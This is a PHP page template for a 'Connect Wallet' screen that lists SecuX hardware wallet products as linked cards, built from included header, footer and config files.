<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Connect Wallet | Select Your SecuX Hardware Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <?php $products = getProducts(); ?>
        <div class="container">
            <div class="row text-center mt40">
                <div class="fs20 fw-bold text-secondary pt50">Connect Wallet</div>
                <h1 class="fs60 fw-semibold pt8">Select your device</h1>
            </div>

            <div class="row text-center mt35">
                <?php foreach ($products as $p) : ?>
                    <div class="col-sm-3 px13">
                        <div class="bg-white rounded-5">
                            <a href="<?= base_url('product.php?key=') . $p['key'] ?>" class="text-decoration-none">
                                <img src="<?= $p['img'] ?>" alt="SecuX V20 &amp; W20" class="img-fluid px35 pt60 pb40">
                                <h4 class="fs18 fw-semibold py50 text-secondary"><?= $p['name'] ?></h4>
                            </a>
                        </div>
                    </div>    
                <?php endforeach; ?>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>